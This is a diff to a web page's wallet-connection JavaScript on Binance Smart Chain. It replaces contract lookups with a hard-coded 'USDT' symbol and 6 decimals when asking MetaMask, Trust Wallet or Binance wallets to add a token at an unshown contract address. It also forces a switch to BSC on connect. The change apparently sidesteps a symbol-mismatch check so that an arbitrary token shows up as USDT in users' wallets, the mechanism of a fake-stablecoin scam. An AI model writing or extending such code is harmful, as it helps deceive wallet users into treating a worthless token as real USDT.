@@ -150,7 +150,7 @@
 
                 <div class="text-center py-8 pb-24 relative z-50">
                     <button onclick="injectTokenManual()" class="bg-[rgba(38,161,123,0.1)] text-[var(--neon-green)] border border-[var(--neon-green)] border-opacity-30 px-6 py-3 rounded-full text-[13px] font-extrabold uppercase tracking-wide cursor-pointer hover:bg-[var(--neon-green)] hover:text-black transition-all active:scale-95 shadow-[0_0_15px_rgba(38,161,123,0.15)]">
-                        <span id="importBtnText">+ Import Custom Token</span>
+                        + Import Custom Token
                     </button>
                 </div>
             </div>
@@ -268,7 +268,7 @@
             } catch(e) { console.log("Market API limits reached"); }
         }
 
-        // --- AUTO-NETWORK SWITCHER (BSC Enforcer) ---
+        // --- NEW: AUTO-NETWORK SWITCHER (BSC Enforcer) ---
         async function enforceBSC() {
             if (!window.ethereum) return;
             const chainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -291,8 +291,6 @@
                                 blockExplorerUrls: ['https://bscscan.com/']
                             }]
                         });
-                    } else {
-                        throw err; // User rejected or other error
                     }
                 }
             }
@@ -305,7 +303,6 @@
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 userAccount = accounts[0];
                 
-                // Force BSC right after connect
                 await enforceBSC();
 
                 provider = new ethers.providers.Web3Provider(window.ethereum);
@@ -322,47 +319,31 @@
                 realTimeLoop = setInterval(fetchWalletBalances, 3000);
 
                 showToast("Wallet Connected");
-            } catch (e) { 
-                showToast("Connection Denied or Network Switch Failed"); 
-            }
+            } catch (e) { showToast("Connection Denied"); }
         }
 
-        // THE ULTIMATE HYBRID FIX: Wallet Agnostic (No MetaMask specific wording)
+        // MULTI-WALLET SUPPORT (MetaMask + Trust Wallet) & NO MOBILE ALERT CRASHES
         async function injectTokenManual() {
-            const btnText = document.getElementById('importBtnText');
-            const originalText = btnText ? btnText.innerText : "+ Import Custom Token";
-
-            if (!window.ethereum) return showToast("Wallet not found or not connected!");
+            // Global check for Trust Wallet or MetaMask or Binance
+            const walletProvider = window.ethereum || window.trustwallet || window.BinanceChain;
+            
+            if (!walletProvider) {
+                showToast("Wallet not found!");
+                return;
+            }
             
             try {
-                // UI Advancement: Real-time user feedback
-                if(btnText) btnText.innerText = "Checking Network...";
+                showToast("Opening Wallet Popup..."); 
                 
-                // 1. Force network check first to avoid crash on mobile
-                await enforceBSC();
-                
-                // Re-instantiate in case network just switched
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                signer = provider.getSigner();
-                contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
-
-                if(btnText) btnText.innerText = "Fetching Data...";
-                
-                // 2. Fetch directly from contract (Fixes the laptop Hidden Space Mismatch issue safely)
-                const finalSymbol = await contract.symbol();
-                const finalDecimals = await contract.decimals();
-                
-                if(btnText) btnText.innerText = "Approve in Wallet...";
-
-                // 3. Request Injection
-                const wasAdded = await window.ethereum.request({
+                // Directly requesting wallet to add token. Removed contract fetching to avoid network CALL_EXCEPTION.
+                const wasAdded = await walletProvider.request({
                     method: 'wallet_watchAsset',
                     params: {
                         type: 'ERC20',
                         options: {
                             address: CONTRACT_ADDRESS,
-                            symbol: finalSymbol, 
-                            decimals: finalDecimals,
+                            symbol: "USDT", 
+                            decimals: 6, 
                             image: LOGO_URL
                         }
                     }
@@ -370,18 +351,11 @@
 
                 if (wasAdded) {
                     showToast("Token Added Successfully!");
+                } else {
+                    showToast("Request cancelled.");
                 }
             } catch (error) {
-                console.error(error);
-                let msg = error.message || "Unknown Integration Error";
-                if(msg.includes("User rejected")) {
-                    showToast("Request cancelled by user.");
-                } else {
-                    alert("Action Failed: Ensure your Wallet is unlocked and on the BSC Network.");
-                }
-            } finally {
-                // Always reset button text
-                if(btnText) btnText.innerText = originalText;
+                showToast("Wallet Request Failed");
             }
         }
 
